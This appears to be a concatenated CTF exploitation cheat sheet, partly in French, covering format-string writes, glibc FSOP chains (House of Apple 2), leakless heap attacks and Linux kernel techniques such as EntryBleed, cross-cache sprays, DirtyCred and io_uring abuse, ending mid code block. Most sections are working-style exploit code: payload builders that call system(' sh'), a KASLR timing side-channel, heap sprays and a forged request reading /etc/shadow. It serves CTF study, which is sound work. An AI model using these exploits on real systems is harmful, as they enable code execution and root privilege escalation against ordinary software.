**Technique:** Patch `.rela.plt` relocation entry symbol index to point to different symbol, then patch `.dynsym` symbol's `st_value` with `win()` address. When the original function is called, dynamic linker reads patched relocation and jumps to `win()`.

```python
# Key addresses (from readelf -S)
REL_SYM_BYTE = 0x4006ec   # .rela.plt[exit].r_info byte containing symbol index
STDOUT_STVAL_LO = 0x4004e8  # .dynsym[11].st_value low halfword
STDOUT_STVAL_HI = 0x4004ea  # .dynsym[11].st_value high halfword

# Format string writes via %hhn (8-bit) and %hn (16-bit)
# 1. Write symbol index 0x0b to r_info byte
# 2. Write win() address low halfword to st_value
# 3. Write win() address high halfword to st_value+2
```

**When GOT has bad bytes but .rela.plt/.dynsym don't:** This technique bypasses all GOT byte restrictions since you never write to GOT directly.

---

## Format String for Game State Manipulation (UTCTF 2026)

**Pattern (Small Blind):** Poker/card game where player name is vulnerable to format string. Stack contains pointers to game state variables (player chips, dealer chips). Write arbitrary values to win condition.

**Key insight:** `%n` writes the number of characters printed so far. Use `%Xc` to control that count, then `%N$n` to write to the Nth stack argument (which points to a game variable).

**Exploitation:**
```python
from pwn import *

p = remote('challenge.utctf.live', 7255)
p.recvuntil(b'Enter your name: ')

# %1000c prints 1000 chars (padding), then %7$n writes 1000 to stack pos 7
# Stack position 7 = pointer to player_chips variable
p.sendline(b'%1000c%7$n')

# Player now has 1000 chips → triggers win condition
# Collect flag from game output
```

**Discovery workflow:**
1. **Confirm format string:** Send `%p.%p.%p.%p` as name, check for hex leaks
2. **Map stack positions:** Try `%6$n`, `%7$n`, `%8$n` with different `%Xc` values
3. **Identify which variable changed:** Compare game output (chips, score, health) before/after
4. **Determine win condition:** May be `player_chips >= threshold` or `player > dealer`
5. **Craft winning payload:** Set player chips high (`%9999c%7$n`) or dealer chips to 0 (`%6$n`)

**Common game state patterns on stack:**
| Position | Typical Variable |
|----------|-----------------|
| 6 | Pointer to dealer/opponent state |
| 7 | Pointer to player state |
| 8-10 | Score, health, inventory |

**When `%n` writes to adjacent variables:** If player and dealer chips are adjacent in memory (4 bytes apart), positions N and N+1 point to them. Write 0 to dealer (`%N$n` with 0 chars printed) and high value to player (`%9999c%(N+1)$n`).

**Key insight:** Format string vulnerabilities in game binaries are simpler than typical pwn — you don't need shell, just manipulate game state to trigger the win condition. Map stack positions to game variables, then write the winning values.

---

## Format String Saved EBP Overwrite for .bss Pivot (PlaidCTF 2015)

**Pattern (EBP):** Format string buffer is in `.bss` (fixed address) rather than on the stack. Classic `%n` arbitrary-write requires attacker addresses on the stack, which is impossible with `.bss` buffers. Instead, overwrite the saved EBP to redirect the function epilogue (`leave; ret`) to the `.bss` buffer.

**How `leave; ret` works:**
```asm
leave:  mov esp, ebp    ; esp = saved_ebp
        pop ebp         ; ebp = [saved_ebp]
ret:    pop eip         ; eip = [saved_ebp + 4]
```

**Exploit layout in `.bss` buffer at address `0x0804A080`:**
```text
[addr_of_buf-4][padding_to_write_value][%n][shellcode...]
```
Write `buf_addr - 4` (e.g., `0x0804A07C`) into saved EBP via `%n`. On function return, `leave` sets `esp = 0x0804A07C`, then `ret` jumps to the value at `0x0804A080` — the start of shellcode.

**Key insight:** When the format string buffer is at a fixed `.bss` address (not stack), overwrite saved EBP to pivot the stack into `.bss`. The `leave; ret` epilogue uses EBP to set ESP, so controlling EBP controls where `ret` reads EIP from. Place shellcode address (or ROP chain) at `buf_addr` and shellcode at `buf_addr + offset`.

---

## FSOP via Format String — glibc 2.35+ (FSOPAgain)

**Contexte :** glibc 2.34 supprime `__free_hook`/`__malloc_hook`. glibc 2.35 ajoute des vérifications de vtable pour FSOP. Mais des contournements existent.

### Vérification vtable glibc 2.35+ (et bypass)

```python
# glibc 2.35 : la vtable doit pointer dans la plage [__io_vtable_check start, end]
# __IO_vtable_check() vérifie que vtable ∈ [__start___libc_IO_vtables, __stop___libc_IO_vtables]

# Bypass 1 : utiliser une vtable LÉGITIME mais avec un comportement exploitable
# _IO_wfile_jumps : vtable légitime → _IO_wfile_overflow → appelle wfile callbacks
# Trick : placer notre fake FILE avec des champs tels que wfile_overflow appelle system()

# Bypass 2 : FSOPAgain (glibc 2.35+)
# Exploiter _IO_wfile_jumps[-0x18] pour pointer vers _IO_helper_jumps
# _IO_helper_jumps contient des entries qui peuvent appeler des fonctions arbitraires
# Aucune vérification sur les vtables INTERNES à helper_jumps

# Bypass 3 : House of Apple 2 (voir advanced.md)
# _wide_data->_IO_write_ptr = system, fp->_flags = " sh\x00"
```

### Template FSOP glibc 2.38+ complet

```python
from pwn import *

def build_fsop_chain(libc, fake_file_addr, system_addr):
    """
    Construit un fake FILE struct pour déclencher system("/bin/sh")
    Compatible glibc 2.35-2.39 via _IO_wfile_jumps
    """
    IO_wfile_jumps = libc.sym['_IO_wfile_jumps']
    IO_wfile_sync  = libc.sym['_IO_file_sync']  # Pour trouver le bon offset
    
    # Structure _IO_FILE_complete_plus (avec _wide_data et vtable)
    # Offset clés :
    # +0x00 : _flags
    # +0x20 : _IO_write_base
    # +0x28 : _IO_write_ptr
    # +0x30 : _IO_write_end
    # +0x48 : _IO_buf_base
    # +0x50 : _IO_buf_end
    # +0x68 : _chain (prochain FILE)
    # +0x88 : _lock (doit pointer vers NULL ou valide)
    # +0xa0 : _wide_data (pointeur vers _IO_wide_data)
    # +0xd8 : vtable

    # Wide data pour House of Apple 2
    wide_data_addr = fake_file_addr + 0x100  # après le FILE struct
    
    fake_file = bytearray(0x200)
    
    # _flags : " sh\x00" pour que system(fp) = system(" sh")
    # Le flag _IO_MAGIC (0xFBAD...) n'est pas nécessaire pour wfile_overflow
    fake_file[0:4] = b' sh\x00'
    
    # _IO_write_base = 1 (non-nul → déclenche overflow)
    fake_file[0x20:0x28] = p64(1)
    # _IO_write_ptr > _IO_write_base
    fake_file[0x28:0x30] = p64(2)
    
    # _IO_buf_base pour certaines variantes
    fake_file[0x38:0x40] = p64(fake_file_addr)  # self-reference parfois nécessaire
    
    # _lock : pointer vers une zone nulle (nécessaire pour éviter crash)
    lock_addr = libc.sym['_IO_stdfile_1_lock']  # zone déjà nulle dans libc
    fake_file[0x88:0x90] = p64(lock_addr)
    
    # _wide_data : pointer vers notre fake wide_data
    fake_file[0xa0:0xa8] = p64(wide_data_addr)
    
    # vtable : _IO_wfile_jumps (vtable légitime mais exploitable)
    fake_file[0xd8:0xe0] = p64(IO_wfile_jumps)
    
    # fake _wide_data : _wide_vtable doit pointer vers zone avec write_ptr = system
    # +0x18 : _IO_write_ptr dans wide_data
    # +0x30 : _wide_vtable
    wide_data = bytearray(0x100)
    wide_data[0x18:0x20] = p64(system_addr)  # sera appelé
    wide_vtable_addr = wide_data_addr + 0x60
    wide_data[0x30:0x38] = p64(wide_vtable_addr)
    
    # fake wide vtable : offset +0x18 = doallocate → pointe vers system
    wide_vtable = bytearray(0x40)
    wide_vtable[0x18:0x20] = p64(system_addr)
    
    # Assembler
    fake_file[0x100:0x200] = wide_data[:0x100]
    
    return bytes(fake_file)

# Usage : via format string write → overwrite stdout → fflush(stdout) → RCE
stdout_addr = libc.sym['_IO_2_1_stdout_']
fake_file_data = build_fsop_chain(libc, fake_file_addr, system_addr)

# Écrire le fake file via format string writes (%hn byte par byte)
# puis corrompre le pointeur _IO_list_all ou stdout directement
```

### FSOP via _IO_list_all

```python
# _IO_list_all : liste chaînée de tous les FILE structs
# Si on contrôle un FILE dans la liste → exit() ou fflush() le traversera

# Overwrite _IO_list_all → pointer vers notre fake FILE
# exit() appelle fflush(stdout) → traverse _IO_list_all → appelle vtable

io_list_all = libc.sym['_IO_list_all']
# Écrire fake_file_addr dans _IO_list_all via format string
payload = fmtstr_payload(fmt_offset, {io_list_all: fake_file_addr})

# Déclencher : appeler exit() ou return depuis main
```

### Détecter la version glibc pour choisir la technique

```python
from pwn import *
libc = ELF('./libc.so.6')

version = libc.libc_start_main_return  # heuristique
# Ou :
version_str = subprocess.check_output(['strings', 'libc.so.6'])
# Chercher "GLIBC_2.3X"

if libc_version < (2, 34):
    # __free_hook disponible (plus simple)
    target = libc.sym['__free_hook']
elif libc_version < (2, 35):
    # House of Apple 2 simple
    pass
else:
    # FSOPAgain ou House of Apple 2 avec wide_data trick
    pass
```

---

## argv[0] Overwrite for Stack Smash Info Leak (HITCON CTF 2015)

**Pattern (nanana):** When a stack canary is corrupted, glibc's `__stack_chk_fail` prints: `*** stack smashing detected ***: <argv[0]> terminated`. Since `argv[0]` is a pointer stored on the stack, overwriting it with the address of a secret (e.g., global password buffer) leaks the secret through the crash message.

**Attack steps:**
1. Overflow past the canary (deliberately corrupting it)
2. Continue overwriting the stack to reach `argv[0]` (pointer to program name)
3. Replace `argv[0]` with the address of the target data (e.g., `0x601090` = `g_password`)
4. The stack smash handler prints: `*** stack smashing detected ***: <password_contents>`

```python
# Overflow to overwrite argv[0] with address of global password
payload = b"A" * canary_offset     # reach canary (deliberately corrupt it)
payload += b"B" * (argv0_offset - canary_offset)  # padding to argv[0]
payload += p64(password_addr)      # overwrite argv[0] -> password string
```

**Key insight:** A "failed" exploit that triggers `__stack_chk_fail` becomes an information leak when `argv[0]` is overwritten. This is useful as a first stage: leak a secret (password, canary, address), then use it in a second connection for the real exploit. Works because `argv` is stored on the stack above local variables.



---

<!-- Source: heap-leakless.md -->

# CTF Pwn — Leakless Heap Exploitation (glibc 2.32+)

L'ère du "leak first, exploit second" est révolue. Les techniques modernes permettent d'obtenir RCE sans aucune fuite d'adresse préalable. Ce fichier couvre les techniques **leakless** pour glibc 2.32–2.39+.

## Table des matières
- [Safe-Linking (glibc 2.32+) — rappel](#safe-linking-glibc-232--rappel)
- [House of Rust — Bypass Safe-Linking sans leak](#house-of-rust--bypass-safe-linking-sans-leak)
- [House of Water — tcache_perthread_struct attack](#house-of-water--tcache_perthread_struct-attack)
- [House of Tangerine — Leakless tcache AAW sans free()](#house-of-tangerine--leakless-tcache-aaw-sans-free)
- [House of Corrosion — global_max_fast corruption](#house-of-corrosion--global_max_fast-corruption)
- [Chaîne complète : Water + Apple 2](#chaîne-complète--water--apple-2)
- [Decision tree : quelle technique choisir ?](#decision-tree--quelle-technique-choisir-)

---

## Safe-Linking (glibc 2.32+) — rappel

```python
# fd mangled = fd_real XOR (chunk_addr >> 12)
# Pour déchiffrer : on a besoin du heap key
# heap_key = chunk_addr >> 12  (les 12 bits bas = offset dans la page)

# Obtenir le heap key sans leak :
# Allouer deux chunks de même taille dans le tcache
# Free chunk A → fd = NULL ^ heap_key = heap_key (lisible si UAF)
# heap_key = leaked_fd  (car NULL XOR key = key)

# Forger un fd manglé :
def mangle(ptr, heap_key):
    return ptr ^ heap_key

# Exemple : tcache poison avec safe-linking
heap_key = u64(leak_chunk_fd()) & ~0xfff  # les 52 bits hauts
target = libc.sym['__free_hook']
forged_fd = target ^ heap_key
# Overwrite fd du chunk freé avec forged_fd
# malloc() → retourne target → write primitive
```

---

## House of Rust — Bypass Safe-Linking sans leak

**Cible :** glibc 2.32–2.35 | **Prérequis :** UAF ou double-free, overwrite partiel possible

**Idée :** safe-linking protège fd mais PAS les chunks dans la tcache bins list elle-même. En corrompant partiellement le fd avec un seul octet connu, on peut forcer une allocation à un endroit prévisible.

```python
# House of Rust : partial fd overwrite (1-2 bytes)
# tcache bin entry : [count][fd_mangled]
# Si on connaît heap_key partiel (bas 12 bits = 0, donc key = addr >> 12)
# Et si PIE bas = 0 (toujours vrai pour heap), overwrite dernier octet

# Chunk A freé → fd = NULL ^ (A >> 12)
# Overwrite le dernier octet de fd → redirige vers offset connu dans heap
# (1/16 chance de succès si nibble bas inconnu, souvent adresse déterministe)

# Implémentation : brute-force nibble (16 tentatives max)
for nibble in range(16):
    target_fd = (heap_base + known_offset) ^ heap_key
    last_byte = (target_fd & 0xff) | nibble
    overwrite_byte(chunk_a_fd_addr, last_byte)
    
    # Tenter malloc : si succès → on a le bon nibble
    ptr = malloc(chunk_size)
    if ptr == expected_addr:
        break
```

---

## House of Water — tcache_perthread_struct attack

**Source :** [corgi.rip/posts/leakless_heap_1](https://corgi.rip/posts/leakless_heap_1/)  
**Cible :** glibc 2.32+ | **Révolutionnaire :** Safe-Linking ne protège PAS `tcache_perthread_struct`

### Pourquoi tcache_perthread_struct est vulnérable

```c
// Structure tcache_perthread_struct (dans le heap, au tout début)
typedef struct tcache_perthread_struct {
    uint16_t counts[TCACHE_MAX_BINS];   // 64 * 2 = 128 bytes
    tcache_entry *entries[TCACHE_MAX_BINS];  // 64 * 8 = 512 bytes
} tcache_perthread_struct;
// Total : 640 bytes, alloué dans kmalloc-1024
// Adresse : généralement heap_base + 0x10
```

**Vulnérabilité :** les `entries[]` sont des pointeurs bruts (non manglés par safe-linking). En obtenant un write primitive vers `tcache_perthread_struct`, on contrôle les 64 bins tcache → allocation arbitraire.

### Exploit

```python
from pwn import *

# Phase 1 : Obtenir un write sur tcache_perthread_struct
# (via overflow, off-by-one, UAF...)

# Phase 2 : Overwrite une entrée tcache pour pointer vers libc
# L'entrée [bin_index] dans entries[] est un pointeur direct vers le prochain chunk free
# Remplacer par l'adresse d'une target dans libc

# Exemple : mettre __malloc_hook dans le tcache bin de taille 0x20
tcache_perthread = heap_base + 0x10
entries_offset = 128 + 8 * 2  # entries[] pour bin de taille 0x20 (index 2)
target_entry = tcache_perthread + entries_offset

# Écrire __malloc_hook dans l'entrée tcache
write_primitive(target_entry, libc.sym['__malloc_hook'])

# Phase 3 : malloc(0x20) retourne __malloc_hook
hook_ptr = malloc(0x20)
write_to(hook_ptr, one_gadget)  # Overwrite __malloc_hook

# Phase 4 : trigger malloc → RCE
malloc(1)  # → one_gadget
```

### Variante leakless : Heap self-reference

```python
# Trick : écrire une adresse libc dans tcache SANS avoir leaké libc
# 1. Créer un chunk de taille appartenant au unsorted bin (>0x400)
# 2. Le free() → fd/bk pointent vers libc (main_arena)
# 3. Le chunk est dans tcache_perthread_struct.entries[]
# 4. Overwrite le count pour qu'il croie que des chunks sont dans ce bin
# 5. malloc() de la même taille retourne un pointeur DANS libc → leak automatique

# Phase de setup : free un large chunk pour mettre des ptrs libc dans le heap
malloc_and_free(0x500)  # fd/bk = main_arena + offset
# Maintenant heap contient des adresses libc → leakables via tcache_perthread
```

---

## House of Tangerine — Leakless tcache AAW sans free()

**Source :** [born0monday.me/posts/house-of-tangerine](https://born0monday.me/posts/house-of-tangerine/)  
**Cible :** glibc 2.39+ | **Unique :** ne requiert PAS de free(), uniquement malloc + overflow

```python
# Principe : Corrompre la tcache_perthread_struct via overflow dans un chunk adjacent
# En manipulant les counts[] et entries[], obtenir AAW sans jamais appeler free()

# Setup : allouer des chunks adjacents à tcache_perthread_struct
# tcache_perthread_struct est toujours dans le 1er chunk du heap

# Étape 1 : Obtenir un overflow dans le chunk B adjacent à perthread
# (overflow depuis chunk A vers chunk B, puis de B vers perthread)

# Étape 2 : Modifier tcache_perthread_struct.counts[i] → > 0
# Cela fait croire qu'il y a un chunk dans le bin i

# Étape 3 : Modifier tcache_perthread_struct.entries[i] → target address
# (pas de safe-linking car c'est dans perthread, pas dans un chunk freé)

# Étape 4 : malloc(size_for_bin_i) → retourne target address
# Write primitive sur target

# Implémentation concrète
def house_of_tangerine(overflow_chunk, target_addr, bin_size=0x20):
    bin_idx = (bin_size >> 4) - 1  # indice du bin pour taille bin_size
    counts_offset = bin_idx * 2    # counts[] offset dans perthread
    entries_offset = 128 + bin_idx * 8  # entries[] offset dans perthread
    
    # Payload pour corrompre perthread
    payload = b'\x00' * overflow_distance
    payload += p16(1)  # counts[bin_idx] = 1 (1 chunk disponible)
    # ... remplir jusqu'à entries[bin_idx] ...
    payload += p64(target_addr)  # entries[bin_idx] = target
    
    # Envoyer overflow
    overflow(overflow_chunk, payload)
    
    # Allouer : retourne target_addr
    return malloc(bin_size)
```

---

## House of Corrosion — global_max_fast corruption

**Source :** [github.com/CptGibbon/House-of-Corrosion](https://github.com/CptGibbon/House-of-Corrosion)  
**Cible :** glibc 2.27+ | **Prérequis :** unsorted bin attack (écrire dans global_max_fast)

```python
# global_max_fast : contrôle la taille max des fastbins
# Si corrompu à 0xFFFF → TOUT chunk freé va dans les fastbins
# Les fastbins n'ont PAS de safe-linking → écrire des addr libc partout

# Étape 1 : Unsorted bin attack pour écrire dans global_max_fast
# Corrompre bk d'un unsorted bin chunk pour pointer vers global_max_fast - 0x10
corrupted_bk = global_max_fast - 0x10
overwrite_bk(unsorted_chunk, corrupted_bk)
malloc(unsorted_chunk_size)  # → écrit une addr libc dans global_max_fast

# Étape 2 : Maintenant tous les chunks freés vont en fastbin
# free(chunk_near_target) → fd du chunk = contenu précédent de la zone
# Ce fd est l'addr libc précédemment dans global_max_fast

# Étape 3 : Position de la victime
# Un free() va écrire dans fastbin[size >> 4] = &fastbin[0] + (size >> 4) * 8
# Calculer la taille du chunk pour que fastbin[i] tombe sur une target dans libc

target = libc.sym['__free_hook']
fastbin_base = libc.sym['main_arena'] + 8  # fastbin[0] = main_arena.fastbinsY[0]
delta = target - fastbin_base
required_size = (delta // 8) * 16  # taille chunk pour atteindre target
```

---

## Chaîne complète : Water + Apple 2

Combinaison pour RCE complet sans aucun leak (glibc 2.34+, `__free_hook` absent).

```
Phase 1 — Heap leak (tcache fd trick)
  └─ Free chunk → fd = NULL XOR heap_key → heap_key connu

Phase 2 — Unsorted bin → libc leak
  └─ Large malloc/free → fd/bk = main_arena → libc calculable

Phase 3 — tcache_perthread_struct corruption (House of Water)
  └─ Overwrite entries[i] → pointer vers stdout FILE struct en libc

Phase 4 — FSOP via _IO_wfile_jumps (House of Apple 2)
  └─ Fake FILE struct : _flags = " sh\x00"
  └─ vtable chain → _IO_wfile_jumps → _IO_wfile_overflow
  └─ Appel interne : wfile_overflow(fp) → system(fp) où fp = " sh\x00"

Phase 5 — Trigger
  └─ malloc() ou fflush(stdout) → RCE
```

```python
# House of Apple 2 : fake FILE pour glibc 2.34+
# _IO_wfile_jumps permet d'appeler system(fp) quand fp->_flags = " sh"

def build_apple2_payload(fake_file_addr, system_addr, libc):
    IO_wfile_jumps = libc.sym['_IO_wfile_jumps']
    
    fake_file  = p64(0x68732f)           # _flags = " sh" (espace + sh + null)
    fake_file += p64(0) * 7              # _IO_read_ptr...
    fake_file += p64(1)                  # _IO_write_base (doit être != 0)
    fake_file += p64(2)                  # _IO_write_ptr (doit être > base)
    fake_file += p64(0) * 4              # autres fields
    fake_file += p64(system_addr)        # _IO_buf_base → system (via vtable chain)
    fake_file += p64(0) * 6              # padding
    fake_file += p64(fake_file_addr + 0xd8)  # vtable ptr = notre fake vtable
    
    # vtable : doit pointer vers zone proche de _IO_wfile_jumps
    # Trick : vtable ptr décalé de -0x18 pour passer la vérification
    fake_vtable = p64(IO_wfile_jumps - 0x18)  # vtable = _IO_wfile_jumps - 0x18
    
    return fake_file + fake_vtable
```

---

## Decision tree : quelle technique choisir ?

```
                    ┌─────────────────────────────┐
                    │ Quelle version de glibc ?    │
                    └─────────────────────────────┘
                           │                │
                    < 2.32                >= 2.32
                           │                │
                    Classic tcache    Safe-Linking actif
                    poisoning OK            │
                                    ┌───────┴───────┐
                                    │               │
                              free() dispo ?    free() interdit ?
                                    │               │
                           ┌────────┴────┐     House of Tangerine
                           │             │     (malloc-only)
                     Heap base       Heap base
                     connue ?         inconnue ?
                           │               │
                    House of Water    House of Rust
                    (direct perthread) (partial overwrite)
                           │
                    Libc base connue ?
                    ├── Oui → tcache poison + one_gadget
                    └── Non → Combine Water (leak) + Apple 2 (FSOP)
```

| Technique | glibc | Besoin free | Besoin leak | Difficulté |
|-----------|-------|-------------|-------------|------------|
| tcache poison classic | <2.32 | Oui | Partiel | Facile |
| House of Rust | 2.32+ | Oui | Non | Moyen |
| House of Water | 2.32+ | Oui | Non | Moyen |
| House of Tangerine | 2.39+ | **Non** | Non | Difficile |
| House of Corrosion | 2.27+ | Oui | Non (4 bits) | Difficile |
| Water + Apple 2 | 2.34+ | Oui | Non | Expert |



---

<!-- Source: kernel-advanced.md -->

# CTF Pwn — Kernel Exploitation Avancée (2024-2025)

Techniques avancées pour les challenges kernel modernes : cross-cache, DirtyCred, EntryBleed, io_uring, PreviousMode, Segment Heap Windows.

## Table des matières
- [EntryBleed — KASLR bypass universel (CVE-2022-4543)](#entrybleed--kaslr-bypass-universel-cve-2022-4543)
- [SLUBStick / CROSS-X — Cross-Cache Attack](#slubstick--cross-x--cross-cache-attack)
- [DirtyCred — Credential Swapping](#dirtycred--credential-swapping)
- [io_uring Exploitation — Worker Thread Abuse](#io_uring-exploitation--worker-thread-abuse)
- [Elastic Objects — Allocation Hardening Bypass](#elastic-objects--allocation-hardening-bypass)
- [Userfaultfd Restrictions (Linux 5.11+)](#userfaultfd-restrictions-linux-511)
- [Ubuntu 24.04 Hardening — Nouveaux obstacles](#ubuntu-2404-hardening--nouveaux-obstacles)
- [Windows Kernel — PreviousMode Write (CVE-2024-21338)](#windows-kernel--previousmode-write-cve-2024-21338)
- [Windows Kernel — Segment Heap Exploitation](#windows-kernel--segment-heap-exploitation)

---

## EntryBleed — KASLR bypass universel (CVE-2022-4543)

**Source :** [willsroot.io/2022/12/entrybleed.html](https://www.willsroot.io/2022/12/entrybleed.html)  
**Impact :** Bypass KASLR sans privilèges sur tout système Linux avec KPTI activé et Intel CPU  
**Mécanisme :** Prefetch side-channel sur `entry_SYSCALL_64` via TLB timing

```c
#include <time.h>
#include <stdint.h>

// Mesurer le temps d'accès à une adresse kernel (via prefetch)
uint64_t time_prefetch(uint64_t addr) {
    struct timespec start, end;
    
    // Flush TLB de l'entrée
    __asm__ volatile("clflush (%0)" :: "r"(addr) : "memory");
    
    clock_gettime(CLOCK_MONOTONIC, &start);
    
    // Prefetch → si dans TLB (entry_SYSCALL_64 y est après un syscall) = rapide
    __asm__ volatile(
        "prefetchnta (%0)\n"
        "prefetcht2 (%0)\n"
        :: "r"(addr) : "memory"
    );
    
    clock_gettime(CLOCK_MONOTONIC, &end);
    return (end.tv_nsec - start.tv_nsec) + 
           (end.tv_sec - start.tv_sec) * 1000000000ULL;
}

uint64_t entrybleed_kaslr_bypass() {
    // entry_SYSCALL_64 est toujours à kernel_base + 0xC00000 (approximately)
    // Tester chaque offset possible (alignment 2MB = 512 pages de 4KB)
    
    uint64_t KERNEL_BASE_MIN = 0xffffffff80000000ULL;
    uint64_t KERNEL_BASE_MAX = 0xffffffffc0000000ULL;
    uint64_t ALIGN = 0x200000;  // 2MB alignment KASLR
    uint64_t ENTRY_OFFSET = 0xC00000;  // entry_SYSCALL_64 typical offset
    
    // Faire un syscall pour peupler le TLB avec entry_SYSCALL_64
    syscall(SYS_getpid);
    
    uint64_t min_time = UINT64_MAX;
    uint64_t best_guess = 0;
    
    for (uint64_t base = KERNEL_BASE_MIN; base < KERNEL_BASE_MAX; base += ALIGN) {
        uint64_t candidate = base + ENTRY_OFFSET;
        uint64_t t = time_prefetch(candidate);
        
        if (t < min_time) {
            min_time = t;
            best_guess = base;
        }
    }
    
    // Validation : si t < 60 cycles (cache hit) → trouvé
    // Sinon : répéter avec plus de syscalls pour peupler TLB
    return best_guess;
}
```

**Conditions :**
- CPU Intel avec KPTI activé (Linux 4.15+ par défaut)
- AMD EPYC : non vulnérable (architecture différente)
- Patché dans Linux 6.2 (janvier 2023)
- **CTF** : beaucoup de serveurs tournent encore des kernels < 6.2

---

## SLUBStick / CROSS-X — Cross-Cache Attack

**Sources :** [USENIX 2024](https://www.usenix.org/conference/usenixsecurity24/presentation/maar-slubstick) | [CCS 2025](https://dl.acm.org/doi/10.1145/3719027.3765152)  
**Concept :** Exploiter le réallocateur SLUB pour convertir un heap overflow en manipulation de page tables → AAR/AAW universel

### Principe

```
Heap overflow dans slab A (kmalloc-32)
         ↓
Vidanger le slab (free tous les objets)
         ↓
Slab pages retournent au buddy allocator
         ↓
Réclamer les pages comme slab B (kmalloc-96 ou autres)
         ↓
Corruption de l'objet adjacent dans slab B
         ↓
Objet B est une structure connue (tty_struct, seq_operations...)
         ↓
Exploit classique via la structure corrompue
```

### Implémentation Cross-Cache

```c
#include <sys/mman.h>
#include <sched.h>

// CPU pinning pour maximiser la fiabilité (éviter les partial lists cross-CPU)
void pin_cpu(int cpu) {
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    sched_setaffinity(0, sizeof(set), &set);
}

// Phase 1 : Allouer plein de chunks dans le slab vulnérable
#define SPRAY_COUNT 1024
int vuln_fds[SPRAY_COUNT];
for (int i = 0; i < SPRAY_COUNT; i++) {
    vuln_fds[i] = open("/dev/vuln", O_RDWR);  // kmalloc-N allocation
}

// Phase 2 : Créer des "holes" dans le slab pour isoler notre cible
// Libérer en alternance pour avoir des chunks adjacents libres
for (int i = 0; i < SPRAY_COUNT; i += 2) {
    close(vuln_fds[i]);
}

// Phase 3 : Déclencher le overflow dans le chunk restant
trigger_overflow(vuln_fds[1]);  // Overflow vers le chunk adjacent (free)

// Phase 4 : Vider TOUT le slab → pages retournent au buddy
for (int i = 1; i < SPRAY_COUNT; i += 2) {
    close(vuln_fds[i]);
}

// Phase 5 : Réclamer les pages avec des objets différents (cross-cache)
// spray avec tty_struct (kmalloc-1024) si slab cible est vidé
int ptmx_fds[256];
for (int i = 0; i < 256; i++) {
    ptmx_fds[i] = open("/dev/ptmx", O_RDWR | O_NOCTTY);  // kmalloc-1024
}

// Phase 6 : Notre overflow corrompt maintenant un tty_struct → exploit classique
```

### Détecter CONFIG_RANDOM_KMALLOC_CACHES (Ubuntu 24.04 defense)

```bash
# Ubuntu 24.04 ajoute CONFIG_RANDOM_KMALLOC_CACHES
# Chaque boot : kmalloc-N devient un cache aléatoire parmi plusieurs
# Cross-cache devient beaucoup plus difficile (caches ne partagent pas les pages)

grep RANDOM_KMALLOC /boot/config-$(uname -r)
# → CONFIG_RANDOM_KMALLOC_CACHES=y → cross-cache très difficile
# → not set → cross-cache faisable

# Alternative : CROSS-X (CCS 2025) contourne RANDOM_KMALLOC_CACHES
# Via elastic objects qui peuvent prendre différentes tailles selon configuration
```

---

## DirtyCred — Credential Swapping

**Source :** [zplin.me/papers/DirtyCred.pdf](https://zplin.me/papers/DirtyCred.pdf)  
**Concept :** Au lieu d'écraser des pointeurs de code, swapper les `struct cred` dans le kernel heap.

```c
// DirtyCred flow :
// 1. Trouver une vuln qui permet de free() une struct cred non-SYSTEM
// 2. Sprayer le heap avec des struct cred de SYSTEM process (via setuid binaries)
// 3. Notre vuln free → struct cred libérée → alloué par SYSTEM cred spray
// 4. Les deux processus partagent maintenant le même cred → nous avons root

// Trigger spray avec pipe2() + userfaultfd (Linux < 5.11) :
int pipefd[2];
pipe2(pipefd, 0);
// Le write bloquant dans userfaultfd permet de contrôler le timing

// Alternative sans userfaultfd (Linux 5.11+) :
// Utiliser des file descriptors avec des setuid binaries
// open("/usr/bin/su") → crée une file struct avec elevated cred
// Race via multiple threads + futex pour contrôler timing

// Exploitation container escape (StarLabs 2023)
// Swap cred d'un process container avec cred host SYSTEM
// Donne accès root hors du namespace
```

**Restrictions Linux 5.11+ :**
```bash
# userfaultfd limité (nécessite CAP_SYS_PTRACE ou /dev/userfaultfd)
cat /proc/sys/vm/unprivileged_userfaultfd  # 0 = désactivé
ls -la /dev/userfaultfd  # Alternative via device si présent

# Alternative : FUSE pour race stabilization
# Ou : io_uring avec des operations lentes
```

---

## io_uring Exploitation — Worker Thread Abuse

**Source :** [chomp.ie/Blog+Posts/Put+an+io_uring+on+it](https://chomp.ie/Blog+Posts/Put+an+io_uring+on+it+-+Exploiting+the+Linux+Kernel)

**Concept :** io_uring passe certains syscalls à des kernel worker threads tournant en **ring 0 avec UID 0 et toutes les capabilities**, permettant de bypasser des checks capability-based.

```c
#include <liburing.h>

// io_uring abuse : soumettre une opération qui bypasse les checks
struct io_uring ring;
io_uring_queue_init(32, &ring, 0);

// Exemple CVE-2022-29582 : sendmsg() offloaded au kernel worker
// Le worker thread a toutes les caps → sendmsg vers socket protégé

struct io_uring_sqe *sqe = io_uring_get_sqe(&ring);
io_uring_prep_sendmsg(sqe, target_fd, &msg, 0);
io_uring_sqe_set_flags(sqe, IOSQE_ASYNC);  // Force l'exécution async (worker)

io_uring_submit(&ring);

// Pattern CTF io_uring UAF (avec SQE injection) :
// 1. Allouer des SQEs dans un slab
// 2. UAF sur le slab → réutiliser pour forger des SQEs
// 3. Soumettre le SQE forgé : IORING_OP_OPENAT sur /etc/shadow
// 4. Worker kernel lit le fichier avec UID 0

// Créer un IORING_OP_OPENAT forgé
struct io_uring_sqe fake_sqe = {
    .opcode = IORING_OP_OPENAT,
    .fd = AT_FDCWD,
    .addr = (uint64_t)"/etc/shadow",
    .open_flags = O_RDONLY,
    .len = 0,
};
```

---

## Elastic Objects — Allocation Hardening Bypass

**Concept :** Certains objets kernel peuvent être alloués dans des caches de tailles différentes selon leur configuration. Exploiter ces "elastic objects" pour contourner RANDOM_KMALLOC_CACHES.

```c
// msg_msg : objet classique élastique
// Alloué dans kmalloc-N où N dépend de la taille du message
// Toujours alloué, jamais randomisé car dans un cache spécial

// Spray avec msg_msg pour remplacer des objets freés
struct msgbuf {
    long mtype;
    char mtext[SIZE - sizeof(long)];
};

int msqid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
struct msgbuf msg = {.mtype = 1};

// Remplir avec payload (sera dans le heap à la taille SIZE)
memset(msg.mtext, 'A', sizeof(msg.mtext));
msgsnd(msqid, &msg, sizeof(msg.mtext), 0);

// msg_msg occupe kmalloc-64 à kmalloc-1024 selon la taille
// pipe_buffer : autre elastic object (kmalloc-192)
// user_key_payload : elastic (kmalloc-32 à kmalloc-1024)
```

---

## Userfaultfd Restrictions (Linux 5.11+)

```bash
# Vérifier si userfaultfd est disponible
